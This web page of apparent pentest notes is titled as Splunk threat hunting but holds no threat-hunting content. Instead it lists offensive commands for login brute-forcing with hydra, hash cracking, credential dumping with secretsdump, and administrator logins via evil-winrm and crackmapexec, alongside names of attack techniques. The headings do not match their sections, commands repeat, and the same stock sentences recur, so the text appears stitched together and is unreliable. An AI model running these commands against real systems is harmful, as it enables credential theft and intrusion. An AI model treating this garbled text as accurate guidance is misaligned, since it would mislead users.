---
TitleSEO: "Threat Hunting with Splunk | ZureFX"
TitlePost: "Threat Hunting with Splunk"
Author: "ZureFX"
Description: "Personal notes on Threat Hunting with Splunk. Quick reference for pentesting and CTF challenges."
Keywords: "windows, networking, enumeration, oscp"
URL: "https://zurefx.github.io/notes/note-threat-hunting-with-splunk-167.html"
URL_IMAGES: ""
Date: "2026-01-15"
Tags: "Windows, Networking, Enumeration, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-threat-hunting-with-splunk-167"
Permalink: "/notes/note-threat-hunting-with-splunk-167.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeDebugPrivilege

### SUID Binary

- `SSRF`
- `GPP Password`
- `mimikatz`
- `msfvenom`
- `XXE`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.241.254/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.36.155.113 -u administrator -p 'P@ssw0rd!'
```

## Writable PATH

### Silver Ticket

```powershell
crackmapexec smb 10.45.193.5 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.75.164.191/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
gobuster dir -u http://10.36.203.162/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.64.253.191 -u administrator -p 'P@ssw0rd!' --shares
```

- `Pass the Ticket`
- `secretsdump`
- `wpscan`

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

> **Note:** SSTI was identified as the primary attack vector in this scenario.

## MSSQL

### Insecure Deserialization

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.90.50
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.236.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## NFS No Root Squash

### impacket

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## LDAP

### rpcclient

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

- `metasploit`
- `Open Redirect`
- `Path Traversal`
- `mimikatz`
- `AS-REP Roasting`

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
evil-winrm -i 10.109.219.205 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.82.202.211 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

## IMAP

### ldapsearch

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.25.6.37 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.90.180 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.
